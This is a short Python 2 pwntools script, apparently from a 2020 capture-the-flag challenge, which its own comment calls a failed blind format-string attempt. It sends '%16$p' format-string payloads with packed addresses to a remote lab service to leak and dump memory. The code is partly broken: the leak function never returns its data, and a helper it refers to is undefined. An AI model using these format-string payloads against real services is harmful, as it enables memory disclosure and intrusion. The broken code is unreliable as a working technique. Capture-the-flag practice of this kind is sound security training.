#same msfctf 2020 failed blind fmt string
import binascii
import pwn
import sys
import hexdump 

RHOST = "172.15.11.101"
RPORT = 1337
p = pwn.remote(RHOST,RPORT)

def leakStringAt(s,address):
  data = "%16$pAAAA" + pwn.p64(address)
  try:
    p.sendline("%16$pAAAA" + pwn.p64(address))
  except EOFError:
    raise EOFError
  try:
     code = (p.recv().replace("Hello"," ").strip().split("AAAA"))
     print(code)
  except EOFError:
    print " [X] EOFError trying to leak from %x" % address
    return None

def a():
  address = 0x400696
  size = 100
 
  remainingSize = size
  out = bytearray("")
  while remainingSize > 0:
    try:
      p.recv()
      p.sendline("2")
      p.recvline()
      data = leakStringAt(p,(address + size - remainingSize))
    except EOFError:
      return out
    if data == None:
      remainingSize -= 1
    else:
      out += bytearray(data)
      remainingSize -= len(data) + 1
    out += bytearray("\x00")
  return out



base_addr = 0x400000
leaked = ""

if __name__ == "__main__":
  a()

  #while remainingSize > 0:
  #data = leakBlock(p,0x400696,0x100)
  #print pwn.disasm(data,arch='amd64')
  """
  while len(leaked) < 32000:
    addr = base_addr + len(leaked)
    print("DEBUG[*]:{}".format(hex(addr)))
    x = leakBlock(p,addr,0x100)
    if x:
      leaked += x
    else:
      leaked += "\xff"
  #print leaked
  """
  #print pwn.disasm(data,arch='amd64')

  
  
